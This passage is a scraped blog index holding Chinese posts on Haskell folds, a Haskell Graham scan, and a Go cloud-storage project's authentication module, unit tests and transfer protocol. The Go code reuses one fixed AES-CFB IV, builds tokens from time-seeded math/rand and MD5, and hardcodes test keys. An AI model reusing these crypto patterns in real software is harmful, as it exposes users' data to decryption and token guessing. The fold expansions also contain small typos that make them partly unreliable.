999998) + 999999) + 1000000 --&gt; (((((((((0 + 1) + 2) + 3) + 4) + 5) + ...) + 999997) + 999998) + 999999) + 1000000 --&gt;-- Now we can actually start reducing:((((((((1 + 2) + 3) + 4) + 5) + ...) + 999997) + 999998) + 999999) + 1000000 --&gt;(((((((3 + 3) + 4) + 5) + ...) + 999997) + 999998) + 999999) + 1000000 --&gt;...(499998500001 + 999999) + 1000000 --&gt;499999500000 + 1000000 --&gt;500000500000 由此可见，二者能够处理的列表长度其实相同，主要受栈空间的限制。foldr 受栈空间限制的原因是它本身并不采用尾递归，而 foldl 尽管使用了尾递归的形式，但因为惰性求值的特性：表达式仅在真正需要它们的值的时候才会被计算，故形式上的尾递归并没有真正起作用。所以 foldr 的限制是无法解除的，但 foldl 只要摒弃惰性求值，就可以摆脱限制，从形式上的尾递归变成真实意义上的尾递归。 另外，我们还能看出， foldl 隐含了堆列表做一个逆序操作，而 foldr 则保持了列表的顺序 。 这两者因为效率低下，在生产代码中均不会出现。 Foldl’使用 seq 可以使表达式被立刻求值。foldl&#39; 的定义如下，每次进入尾递归前都要计算出参数 z&#39; 的值，而不是将表达式的绑定入堆，之后再入栈、出栈。生产代码中只会出现 foldl&#39;。 123foldl' f z [] = zfoldl' f z (x:xs) = let z' = z `f` x in seq z' $ foldl' f z' xs 现在上面例子的计算过程如下，运算将不会导致栈溢出。 123456789foldl' (+) 0 [1..1000000] --&gt;foldl' (+) 1 [2..1000000] --&gt;foldl' (+) 3 [3..1000000] --&gt;foldl' (+) 6 [4..1000000] --&gt;foldl' (+) 10 [5..1000000] --&gt;-- ...foldl' (+) 499999500000 [1000000] --&gt;foldl' (+) 500000500000 [] --&gt;500000500000 通常，我们会在 foldr 和 foldl&#39; 之间选择。 但使用 foldl&#39; 也存在缺陷，考虑下面的例子，foldl 将返回 0（foldr 也一样），而 foldl&#39; 将产生一个 undifined 错误。这是因为 (*) 具有短路特性，如果 (*) 符号右侧的子式为 0 ，则左式不必计算。在 foldl 中，最终展开式为 ((((1 * 2) * 3) * undefined) * 5) * 0，直接求出结果为 0；在 foldr 中，最终展开式为 2 * (3 * (undifined * (5 * (0 * 1))))，可以看出，首先 5 * (0 * 1) 计算出 0，之后变为 2 * (3 * (undifined * 0))，此时短路，因此求出 0。 12foldl (*) 1 [2,3,undefined,5,0]foldl' (*) 1 [2,3,undefined,5,0] Foldr 和 Foldl 的转化foldl 和 foldr 可以互相表示。 用 foldr 表示 foldl 如下。这个转化其实并不完全正确，因为 foldr 可以处理无穷列表，而 foldl 本身并不具有这一特性。 123foldl'' :: (a -&gt; b -&gt; a) -&gt; a -&gt; [b] -&gt; afoldl'' f z xs = foldr step id xs z where step x g acc = g (f acc x) 类似的，用 foldl 表示 foldr 如下。 123foldr'' :: (b -&gt; a -&gt; a) -&gt; a -&gt; [b] -&gt; afoldr'' f z xs = foldl step id xs z where step g acc x = g (f acc x) 这里我将试图把自己的理解表述出来： 以 foldr 表示 foldl 为例。foldr 看上去似乎接收了四个参数，但经过部分施用，foldr step id xs 实际产生了一个类型签名为 a -&gt; a 的结果，这里的 a 即为 foldl 传入的零值 z 的类型。因此 foldr 的作用即是产生了这样一个函数，这个函数的格式类似上面例子中的 1 + (2 + (3 + (4 + (... + (999999 + (1000000 + 0))...))))，但它接收一个参数，这个参数就是式中的 0，即它接收传入的零值 z，返回对这个零值作用的结果。 下面观察函数是如何产生的。step 作为折叠函数，接收三个参数，参数 x 是剩余列表的最后一个元素（因为是 foldr，方向从右向左），参数 acc 是累积值。我们知道 foldr 中的折叠函数实际只接收两个参数，因此 step 是一个部分施用的函数。观察 step 的类型签名，因为在 foldr 中，它接受一个函数 id 作为零值，所以它的类型是 a -&gt; (b -&gt; b) -&gt; (b -&gt; b)。因为 step 每次只能获得两个参数（剩余列表中的最后一个值和 acc），所以它将返回一个 (b -&gt; b) 作为下一次的 acc。 用一个例子演示 foldr 具体的展开过程。考虑 foldl&#39;&#39; f zero [a1, a2, a3]，这里 foldl&#39;&#39; 是用 foldr 表示的 foldl。其展开过程如下： 12345678910foldl'' f zero [a1, a2, a3]= (foldr step id [a1, a2, a3]) zero= (step a1 (step a2 (step a3 id))) zero= (step a1 (step a2 (\\z -&gt; id (f z a3)))) zero= (step a1 (\\y -&gt; (\\z -&gt; id (f z a3)) (f y a2))) zero= (\\x -&gt; (\\y -&gt; (\\z -&gt; id (f z a3)) (f y a2)) (f x a1)) zero= (\\x -&gt; (\\y -&gt; (\\z -&gt; f z a3) (f y a2)) (f x a1)) zero= (\\x -&gt; (\\y -&gt; f (f y a2) a3) (f x a1)) zero= (\\x -&gt; f (f (f x a1) a2) a3) zero= f (f (f zero a1) a2) a3 在上面的展开过程中，首先按 foldr 过程展开成一系列 step 的叠加，之后从内向外逐步嵌套，成为一系列 foldl 传入的折叠函数 f 的组合：这个组合要计算的第一个直接子式（无需经过入栈、出栈即可计算出结果）接收 foldl 传入的零值 zero。 同理，可以写出用 foldl 实现 foldr&#39;&#39; 具体的展开过程，仍以 foldr&#39;&#39; f zero [a1, a2, a3] 为例，其展开过程如下： foldr’’ f z xs = foldl step id xs z where step g acc x = g (f acc x) 123456789foldr'' f zero [a1, a2, a3]= (foldl step id [a1, a2, a3]) zero= (step (step (step id a1) a2) a3) zero= (step (step (\\z -&gt; id (f z a1)) a2) a3) zero= (step (\\y -&gt; (\\z -&gt; id (f z a1)) (f y a2)) a3) zero= (\\x -&gt; (\\y -&gt; (\\z -&gt;id (f z a1)) (f y a2)) (f x z3)) zero= (\\x -&gt; (\\y -&gt; f (f y a2) a1) (f x a3)) zero= (\\x -&gt; f (f (f x a3) a2) a1) zero= f (f (f zero a3) a2) a1 尽管二者可以互相表示，但仅仅是显式形式上的，其它隐式的性质仍然是形式所无法表征的。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/18/haskell-fold/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"sicp","slug":"sicp","permalink":"http://forec.github.io/tags/sicp/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"Haskell 的葛立恒扫描法","slug":"haskell-graham","date":"2016-11-17T15:50:20.000Z","updated":"2016-11-17T06:11:46.000Z","comments":true,"path":"2016/11/17/haskell-graham/","link":"","permalink":"http://forec.github.io/2016/11/17/haskell-graham/","excerpt":"使用 Haskell 实现凸包葛立恒扫描法。最近在重温 Haskell，准备学习 Haskell 的并行编程。","text":"使用 Haskell 实现凸包葛立恒扫描法。最近在重温 Haskell，准备学习 Haskell 的并行编程。 相关链接 凸包（Wiki: Convex hull） 葛立恒扫描法（Wiki: Graham scan） 实现 计算折线 &lt;a, b, c&gt; 方向时，使用有向面积判断：(px b-px a)*(py c-py a)-(py b-py a)*(px c-px a)，若该面积大于 0 则为左转，等于 0 则为直线，否则右转。 将顶点列表按与初始顶点 P0 的夹角排序时，可能遇到 Px 刚好与 P0 垂直，因此斜率无法计算。但可直接计算折线方向，根据方向判断出栈/入栈。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849data Direction = TurnLeft | TurnRight | Straight deriving (Show, Eq)data Point = Point&#123; px :: Int, py :: Int &#125; deriving (Show)calcTurn :: Point -&gt; Point -&gt; Point -&gt; DirectioncalcTurn a b c = if area == 0 then Straight else if area &gt; 0 then TurnLeft else TurnRight where area = (px b-px a)*(py c-py a)-(py b-py a)*(px c-px a)p1 = Point 1 1p2 = Point 3 1p3 = Point 4 3p4 = Point 3 4p5 = Point (-1) 3p6 = Point 2 2p7 = Point 2 3points = [p1, p2, p3, p4, p5, p6, p7]graham :: [Point] -&gt; [Point]graham graph = foldl makeStack [head . tail $ pList, p0] (tail . tail $ pList) where p0 = head . sortBy yco $ graph yco p1 p2 = if y1 == y2 then if x1 &lt; x2 then LT else GT else if y1 &lt; y2 then LT else GT where x1 = px p1 x2 = px p2 y1 = py p1 y2 = py p2 pList = sortBy angle $ graph where angle p1 p2 = if dir == TurnLeft || dir == Straight then LT else GT where dir = calcTurn p0 p1 p2 makeStack [pa] pn = pn : [pa] makeStack acc@(pa:pb:ps) pn@(Point x y) = if dir == TurnLeft || dir == Straight then pn:acc else makeStack (tail acc) pn where dir = calcTurn pb pa pn 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/17/haskell-graham/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"Haskell","slug":"Haskell","permalink":"http://forec.github.io/tags/Haskell/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://forec.github.io/tags/函数式编程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）传输、认证单元测试","slug":"zenith-cloud-4","date":"2016-11-16T03:12:35.000Z","updated":"2016-12-23T17:26:42.000Z","comments":true,"path":"2016/11/16/zenith-cloud-4/","link":"","permalink":"http://forec.github.io/2016/11/16/zenith-cloud-4/","excerpt":"编写传输和认证模块的单元测试。","text":"编写传输和认证模块的单元测试。 Golang 的单元测试需要导入 testing 包，测试函数以 Test 开头，且第一个参数为 testing.T。通常我们设置一个对照列表，这个列表由二元组构成，分别是测试函数输入值和对应的正确输出值。我们编写 verify 函数比对要测试函数的输出和正确输出，如果发现不同则该测试函数失败，并通过 t.Errorf() 报告。 1234567891011// authenticate_test.gofunc verify(t *testing.T, testnum int, testcase string, input, output, expected []byte, err error) &#123; if string(expected) != string(output) || err != nil &#123; t.Errorf(\"%d. %s with input = %s: output %s != %s\", testnum, testcase, string(input), string(output), string(expected)) &#125;&#125; 认证模块单元测试 认证模块的函数耦合度不高，可以独立测试，为每个函数编写一个测试函数。在 authenticate 目录下新建 authenticate_test.go。以 AES CFB 加解密模块为例，下面这三组测试数据是在密钥为 AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP 情况下加密生成的，我们需要测试 AesEncoding 和 AesDecoding 的正确性。 123456// authenticate_test.govar testAESes = []testS&#123; &#123;\"An Apple A Day\", \"\\xca\\x35\\x19\\xc8\\x90\\x0a\\xed\\x4f\\x69\\x09\\x3e\\xb2\\x56\\x41\"&#125;, &#123;\"Keep Doctor Away .\", \"\\xc0\\x3e\\x5c\\xf9\\xc0\\x3e\\xee\\x49\\x3d\\x27\\x6c\\xd6\\x76\\x4f\\xed\\x74\\xeb\\x1a\\xe4\"&#125;, &#123;\"+w-s*a/d%4\", \"\\xa0\\x2c\\x14\\xfa\\xca\\x1b\\xae\\x4e\\x6c\\x7c\"&#125;,&#125; 编写 TestAesDecoding 函数，注意测试列表中的二元组元素均为 string，为了符合 verify 和 AesDecoding 的参数类型，需要对某些位置使用 []byte 或 string 做类型转换。我们将测试列表中二元组的后者作为 AesDecoding 的输入，并将其输出和二元组的前者做比对。 1234567func TestAesDecoding(t *testing.T) &#123; c := NewAesBlock([]byte(\"AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP\")) for i, item := range testAESes &#123; s, err := AesDecode([]byte(item.out), int64(len(item.in)), c) verify(t, i, \"AesDecoding 256bits\", []byte(item.out), []byte(item.in), s, err) &#125;&#125; 同样，将输入、输出参数位置调换即可写出 TestAesEncoding。 12345678// authenticate_test.gofunc TestAesEncoding(t *testing.T) &#123; c := NewAesBlock([]byte(\"AABCDEFGHIJKLMNOPBCDEFGHIJKLMNOP\")) for i, item := range testAESes &#123; s := AesEncode([]byte(item.in), c) verify(t, i, \"AesEncoding 256bits\", []byte(item.in), []byte(item.out), s, nil) &#125;&#125; authenticate_test.go 其它部分代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// authenticate_test.gopackage authenticateimport \"testing\"type testS struct &#123; in string out string&#125;var testBase64s = []testS&#123; &#123;\"An Apple A Day\", \"QW4gQXBwbGUgQSBEYXk=\"&#125;, &#123;\"Keep Doctor Away .\", \"S2VlcCBEb2N0b3IgQXdheSAgLg==\"&#125;, &#123;\"+w-s*a/d%4\", \"K3ctcyphL2QlNA==\"&#125;,&#125;func TestBase64Encoding(t *testing.T) &#123; for i, item := range testBase64s &#123; s := Base64Encode([]byte(item.in)) verify(t, i, \"Base64Encoding\", []byte(item.in), []byte(item.out), s, nil) &#125;&#125;func TestBase64Decoding(t *testing.T) &#123; for i, item := range testBase64s &#123; s, err := Base64Decode([]byte(item.out)) verify(t, i, \"Base64Decoding\", []byte(item.out), []byte(item.in), s, err) &#125;&#125;func TestNewAes(t *testing.T) &#123; testkey1 := \"abcdefghijklmnop\" c := NewAesBlock([]byte(testkey1)) if c == nil &#123; t.Errorf(\"NewAesBlock returns nil with 128bits key %s\", testkey1) &#125; testkey2 := \"abcdefghijklmnopabcdefgh\" c = NewAesBlock([]byte(testkey2)) if c == nil &#123; t.Errorf(\"NewAesBlock returns nil with 192bits key %s\", testkey2) &#125; testkey3 := \"abcdefghijklmnopabcdefghijklmnop\" c = NewAesBlock([]byte(testkey3)) if c == nil &#123; t.Errorf(\"NewAesBlock returns nil with 256bits key %s\", testkey3) &#125;&#125;func TestGenerateToken(t *testing.T) &#123; if !(len(GenerateToken(1)) == 16 &amp;&amp; len(GenerateToken(2)) == 24 &amp;&amp; len(GenerateToken(3)) == 32 &amp;&amp; len(GenerateToken(100)) == 32) &#123; t.Errorf(\"Generate Token Error.\") &#125;&#125; 在 authenticate 目录下启动终端，执行 go test，输出结果为 OK, pass 表明单元测试通过。 传输模块单元测试传输模块无法直接通过相互独立的测试函数验证，因此编写一个用于测试的简单服务器和客户端。在 transmit 目录下新建 transmit_test.go。测试流程如下：客户端向服务器发送连接请求，连接成功则接收服务器发送的一个文件，之后再接收一组字节。如无错误则调用 Destroy() 断开连接。之后测试函数验证客户端接收到的文件和源文件是否相同，接收到的字节流和源字节流是否相同，如二者相左则调用 t.Errorf() 发出错误报告。 客户端函数 我们要测试的功能包括普通字节传输（RecvBytes/SendBytes）、文件传输（SendFromReader/RecvToWriter）以及 Destroy、NewTransmitter 等接口中提供的函数，接口中未导出的函数也会在代码中涉及到。 因为客户端和服务器运行在同一个测试程序中，代码中需要延时一秒以保证服务器启动完成（服务器进入 listen 状态后阻塞，因此客户端需先启动）。 客户端测试函数代码如下： 先启动一个 net.Conn 连接 127.0.0.1:10086 ，即测试服务器监听的端口； 连接成功后创建一个以变量 test_out_filename 命名的文件（该变量是测试代码的全局变量，我们将在编写完测试函数后定义，它指定了测试客户端接收文件时存储的名称）； 创建成功后建立一个新的 transmitter，使用变量 pass 存储的内容作为双方加密的密钥（该变量也是测试代码的全局变量）； transmitter 创建成功后接收一个文件，再接收一个字符串； 将该字符串和 test_string 比对，test_string 同样是可设置的全局变量； 比对结束，无误退出，否则通过 t.Errorf() 报告错误。 12345678910111213141516171819202122232425262728293031// transmit_test.gofunc client_test(t *testing.T) &#123; time.Sleep(time.Second) cconn, err := net.Dial(\"tcp\", \"127.0.0.1:10086\") if err != nil &#123; fmt.Println(\"ERROR: Error dialing\", err.Error()) return &#125; defer cconn.Close() file, err := os.OpenFile(test_out_filename, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666) if err != nil &#123; fmt.Println(\"ERROR: Cannot Open TestOutFile\") return &#125; defer file.Close() fileWriter := bufio.NewWriter(file) ts := NewTransmitter(cconn, BUFSIZE, []byte(pass)) ts.RecvToWriter(fileWriter) recvB, err := ts.RecvBytes() if err != nil &#123; t.Errorf(\"ERROR: Cannot receive bytes\") return &#125; if string(recvB) != test_string &#123; t.Errorf(\"ERROR: Receive bytes error\") return &#125; ts.Destroy() return&#125; 服务器函数（测试函数主线程） 真正的测试函数包含了服务器和客户端的启动，下面简单解释测试函数的流程： 打开要传输的文件，通过函数 GetFileSize 获取文件长度； 监听 127.0.0.1:10086 端口； 启动客户端； 服务器接受客户端请求； 服务器向客户端发送此前打开的文件内容； 服务器发送 test_string 的内容； 至此传输结束，测试函数开始比对文件 test_in_filename 和 test_out_filename，如果无误则退出，否则调用 t.Errorf() 报告错误。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// transmit_test.gofunc TestTransmission(t *testing.T) &#123; file, err := os.Open(test_in_filename) if err != nil &#123; t.Errorf(\"Transmit: Cannot Open TestInFile\") return &#125; defer file.Close() fileReader := bufio.NewReader(file) totalFileLength, err := GetFileSize(test_in_filename) if err != nil &#123; t.Errorf(\"Transmit: GetFileSize function failed\") return &#125; // test server listener, err := net.Listen(\"tcp\", \"127.0.0.1:10086\") if err != nil &#123; fmt.Println(\"test server starting with an error, break down...\") return &#125; defer listener.Close() go client_test(t) sconn, err := listener.Accept() if err != nil &#123; fmt.Println(\"Error accepting\", err.Error()) return &#125; fmt.Println(\"Rececive connection request from\", sconn.RemoteAddr().String()) tr := NewTransmitter(sconn, BUFSIZE, []byte(pass)) tr.SendFromReader(fileReader, int64(totalFileLength)) tr.SendBytes([]byte(test_string)) time.Sleep(time.Second * 2) // verify received vfile, err := os.Open(test_out_filename) if err != nil &#123; t.Errorf(\"Transmit: Cannot Open TestOutFile\") return &#125; defer vfile.Close() rfile, err := os.Open(test_in_filename) if err != nil &#123; t.Errorf(\"Transmit: Cannot Open TestOutFile\") return &#125; defer rfile.Close() vfileReader := bufio.NewReader(vfile) rfileReader := bufio.NewReader(rfile) for &#123; rbyte, err1 := rfileReader.ReadByte() vbyte, err2 := vfileReader.ReadByte() if err1 != nil &amp;&amp; err2 != nil &#123; break &#125; else if err != nil || err2 != nil || rbyte != vbyte &#123; t.Errorf(\"Transmit: Received File Is Not Same With Origin File\") break &#125; &#125;&#125; 代码中用到的 GetFileSize 可以放到此前的 transmit.go 中，作为一个可复用的函数： 123456789// transmit.gofunc GetFileSize(path string) (size int64, err error) &#123; fileInfo, err := os.Stat(path) if err != nil &#123; return -1, err &#125; fileSize := fileInfo.Size() return fileSize, nil&#125; 全局变量指定上面代码中用到的几个全局变量和导入的包声明如下： 12345678910111213141516// transmit_test.gopackage transmitimport ( \"bufio\" \"fmt\" \"net\" \"os\" \"testing\" \"time\")const BUFSIZE int64 = 4096 * 1024const pass string = \"1234567890123456\"const test_in_filename string = \"test_in.exe\"const test_out_filename string = \"test_out.exe\"const test_string string = \"helloworld\" 测试在 transmit 目录下放置一个名为 test_in.exe 的文件用于测试传输，这里我放置了一个 293M 的 Idea 安装包（已重命名为 test_in.exe）作为测试文件。 在 transmit 目录下启动终端，执行 go test，输出结果为 OK, pass 表明测试成功，此时 transmit 目录下还会出现 test_out.exe， 该文件内容和之前放置的 test_in.exe 相同。 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）认证基础模块实现此专栏的下一篇文章：顶点云（应用）数据用户设计 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/16/zenith-cloud-4/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）认证基础模块实现","slug":"zenith-cloud-3","date":"2016-11-15T05:09:47.000Z","updated":"2016-12-23T17:27:30.000Z","comments":true,"path":"2016/11/15/zenith-cloud-3/","link":"","permalink":"http://forec.github.io/2016/11/15/zenith-cloud-3/","excerpt":"使用 Golang 实现此前设计的云存储系统传输、认证协议所需的基础模块。","text":"使用 Golang 实现此前设计的云存储系统传输、认证协议所需的基础模块。 实现 authenticate 包根据项目介绍中提出的需求，authenticate 包中应当提供函数实现以下功能： 计算文件块的 MD5 值 随机生成用于加密的 token，且可根据安全等级决定 token 长度 基本的 AES CFB 加/解密接口 基本的 Base64 编/解码接口 int64 和字节流转换 在工程目录下新建文件夹 authenticate ，在该目录下新建代码 authenticate.go ，以下将逐个实现上述功能。 MD5 值计算 Golang 的 crypto 包提供了一个 md5 计算方法，可以直接调用并包装。函数 MD5(string) []byte 接收一个字符串并返回该字符串计算出的 MD5 字节流： 12345678910// authenticate.goimport ( \"crypto/md5\" \"encoding/hex\")func MD5(text string) []byte &#123; ctx := md5.New() ctx.Write([]byte(text)) return []byte(hex.EncodeToString(ctx.Sum(nil)))&#125; Token 生成 token 的生成方式可以随意选择，这里计算一个随机字符串的 MD5 值作为 token。函数 GenerateToken(level uint8)[]byte 接收一个 uint8 类型的参数 level，该参数指定生成 token 的等级，当 level 为 1 或更低时，生成 16 字节的 token；当 level 为 2 时，生成 24 字节的 token；否则生成 32 字节。GetRandomString(int) string 接收一个正整数，生成参数指定长度的随机字串。 12345678910111213141516171819202122232425// authenticate.goimport ( \"math/rand\" \"time\")func GenerateToken(level uint8) []byte &#123; if level &lt;= 1 &#123; // 128 bits, 16 bits token return MD5(GetRandomString(128))[:16] &#125; else if level == 2 &#123; // 192 bits, 24 bits token return MD5(GetRandomString(128))[:24] &#125; else &#123; // 256 bits, 32 bits token return MD5(GetRandomString(128))[:32] &#125;&#125;func GetRandomString(leng int) string &#123; str := \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\" bytes := []byte(str) result := []byte&#123;&#125; r := rand.New(rand.NewSource(time.Now().UnixNano())) for i := 0; i &lt; leng; i++ &#123; result = append(result, bytes[r.Intn(len(bytes))]) &#125; return string(result)&#125; AES CFB 模块创建 Golang 的 crypto 包提供了 aes 模块和 cipher 模块，aes.NewCipher(key) 将根据 key 生成一个新的 AES 模块。 123456789101112// authenticate.goimport ( \"crypto/aes\" \"crypto/cipher\")func NewAesBlock(key []byte) cipher.Block &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil &#125; return block&#125; 我们使用 cipher.Block 的 CFB 加密模块，commonIV 是 CFB 模式（密码反馈模式）的唯一 IV，和密钥一起作用于加密器，这里取 0~15。函数 AesEncode([]byte, cipher.Block)[]byte 接收一段明文字节流和加密模块，并返回加密后的字节流。 12345678// authenticate.govar commonIV = []byte&#123;0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f&#125;func AesEncode(plaintext []byte, block cipher.Block) []byte &#123; cfb := cipher.NewCFBEncrypter(block, commonIV) ciphertext := make([]byte, len(plaintext)) cfb.XORKeyStream(ciphertext, plaintext) return []byte(ciphertext)&#125; 解密过程和加密类似，但需要事先获知明文长度。函数 AesDecode([]byte, int64, cipher.Block)([]byte, error) 接收密文、明文长度和 AES 模块，如果解密成功则返回明文字节流，否则返回信息中携带错误： 1234567// authenticate.gofunc AesDecode(cipherText []byte, plainLen int64, block cipher.Block) ([]byte, error) &#123; cfbdec := cipher.NewCFBDecrypter(block, commonIV) plaintext := make([]byte, plainLen) cfbdec.XORKeyStream(plaintext, cipherText) return []byte(plaintext), nil&#125; Base64 编/解码 Golang 的 crypto 包提供了可使用的 Base64 编/解码工具，只需要简单将其封装。我们在 authenticate.go 中为其声明一个编码类的实例，将所有编/解码请求委托给该实例。 1234567891011121314// authenticate.goimport( \"encoding/base64\")const ( base64Table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\")var coder = base64.NewEncoding(base64Table)func Base64Encode(plaintext []byte) []byte &#123; return []byte(coder.EncodeToString(plaintext))&#125;func Base64Decode(ciphertext []byte) ([]byte, error) &#123; return coder.DecodeString(string(ciphertext))&#125; int64 和字节流的转换 encoding 包中的 binary 模块可以提供将 uint64 转化为字节流的方法，我们将其包装为两个函数 Int64ToBytes(int64)[]byte 和 BytesToInt64([]byte)int64。 123456789101112// authenticate.goimport( \"encoding/binary\")func Int64ToBytes(i int64) []byte &#123; var buf = make([]byte, 8) binary.BigEndian.PutUint64(buf, uint64(i)) return buf&#125;func BytesToInt64(buf []byte) int64 &#123; return int64(binary.BigEndian.Uint64(buf[:8]))&#125; 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）传输协议实现和封装此专栏的下一篇文章：顶点云（应用）传输、认证单元测试 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/11/15/zenith-cloud-3/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"顶点云（应用）传输协议实现和封装","slug":"zenith-cloud-2","date":"2016-11-13T16:04:34.000Z","updated":"2016-12-23T17:27:10.000Z","comments":true,"path":"2016/11/14/zenith-cloud-2/","link":"","permalink":"http://forec.github.io/2016/11/14/zenith-cloud-2/","excerpt":"使用 Golang 实现上一篇文章设计的云存储系统文件传输协议。将实现代码封装，提供外部访问接口。","text":"使用 Golang 实现上一篇文章设计的云存储系统文件传输协议。将实现代码封装，提供外部访问接口。 设计 transmittersocket 无法维持协议格式，因此需要提供一个 transmitter 类（尽管 Golang 没有提供 OOP 显式表达，但以下将使用 “类” 称呼 strcut，使用 “接口” 称呼 interface，使用 “对象” 称呼 struct 的一个具体实例），该类将 socket 连接包装起来，并向用户提供符合协议要求的接口。此外，下面将使用 “消息” 表示一组符合协议格式的数据流，即满足此前定义的协议格式的一个数据包。 类的私有变量 conn net.Conn: transmitter 的内部实现应当基于 socket 通信，因此内部需要一个 net.Conn 对象。 buf []byte: socket 通信需要一个缓冲区，因为 socket 本身无法维持应用层的消息边界，所以每次从缓冲区读取的数据长度可能超过一个消息的长度，超出部分的数据实际为下个消息的首部。为了保证数据不被丢失，超过一组消息长度的数据应当被保存在缓冲区中，并和下次读取的数据组成一个新的消息。一个 net.Conn 对象应当使用同一个缓冲区，以保证数据不被遗漏。因此 transmitter 类中应当维护 net.Conn 使用的缓冲区。 buflen int64: transmitter 中维护的缓冲区大小，单位为字节。 block cipher.Block: transmitter 应当保证传输数据的安全性，block 是 transmitter 使用的加密模块，将在后面加密部分的文章中介绍。下面假定已有函数 AesEncode(plain []byte, block cipher.Block) []byte 和 AesDecode(encipher []byte, length int64, block cipher.Block)([]byte, err)，这两个函数的功能分别是使用 block 对 plain 字节流加密，以及使用 block 对 encipher 密文解密。前者会返回加密后的字节流，后者会返回解密后的明文，如果解密失败则返回值携带 error。 recvLen int64: 缓冲区中已存储的数据长度，即从 socket 读取的，但超过一个消息长度、尚未被使用的数据长度。每次将 socket 接收到的消息读取到缓冲区后，应当将超过一个消息长度的数据移动至缓冲区最开始的位置，这部分数据长度即为 recvLen，下次 socket 的 read 操作将向缓冲区 buf[recvLen:] 写入。 接口需求分析 基本的内部数据获取和设置 GetConn() net.Conn：获取该 transmitter 内部的 socket 连接。 GetBuf() []byte: 获取该 transmitter 内部的缓冲区。 GetBuflen() int64: 获取该 transmitter 的缓冲区长度。 GetBlock() cipher.Block: 获取该 transmitter 的加密模块。 SetBuflen(int64) bool: 为该 transmitter 设置缓冲区大小，并自动拓展/缩小原有的缓冲区。 析构函数：当 transmitter 寿命终止时，应当调用析构函数 Destroy() 销毁内部的数据并断开 socket 连接。 数据传输接口：transmitter 应当提供一些易使用的公有方法，这些方法可以让用户方便的发送/接收字节流，或者从特定的 Reader 发送字节流，并接收字节流至特定的 Writer。我们在《认证、传输协议设计》中假设过已存在一个 RecvBytes() 函数，该函数能够从 socket 缓冲区读取一组消息。除了要实现该函数，还应当实现对称的 SendBytes(message []byte) 函数，用于向 socket 发送一组消息。同样，应当设计函数 SendFromReader(reader) 和 RecvToWriter(writer) ，它们提供了数据源/目的地是 reader/writer 的操作。 具体定义接口在工程目录下新建文件夹 transmit ，在该目录下新建代码文件 transmit.go，将私有类 transmitter 的公有接口定义为 Transmitable，其 Golang 代码表示如下。其中，SendFromReader 和 RecvToWriter 选择的 Reader/Writer 是 bufio 包中的读写器，因为在传输长数据流中将使用 bufio.Reader 和 bufio.Writer 去读/写文件。SendFromReader 的第二个参数是要发送的长度，如果这个参数大于 Reader 所能读取的长度，则读取到 Reader 末尾结束，否则读取到参数长度即结束。12345678910111213// transmit.gotype Transmitable interface &#123; SendFromReader(*bufio.Reader, int64) bool SendBytes([]byte) bool RecvToWriter(*bufio.Writer) bool RecvBytes() ([]byte, error) Destroy() SetBuflen(int64) bool GetConn() net.Conn GetBuf() []byte GetBuflen() int64 GetBlock() cipher.Block&#125; 实现 transmitterSendBytes() 和 RecvBytes() SendBytes([]byte) bool 的发送过程如下：首先发送一个 8 字节、大端序的明文表明即将发送的总长度，之后按照《认证、传输协议设计》设计的数据协议格式 格式1 发送消息，因为每个消息内包含的数据长度受缓冲区限制，因此可能需要传送多个消息才能发送所有数据。代码如下，其中第 6 行发送待发送数据明文的总长度，用到的 auth.Int64Bytes(int64) []byte 可以将一个 int64 数据转化为 8 字节、大端序的字节数组，与之对称的 BytesToInt64([]byte) int64 可以将参数的前 8 个字节转化为一个 int64 类型，这两个函数将在后面要实现的 authenticate 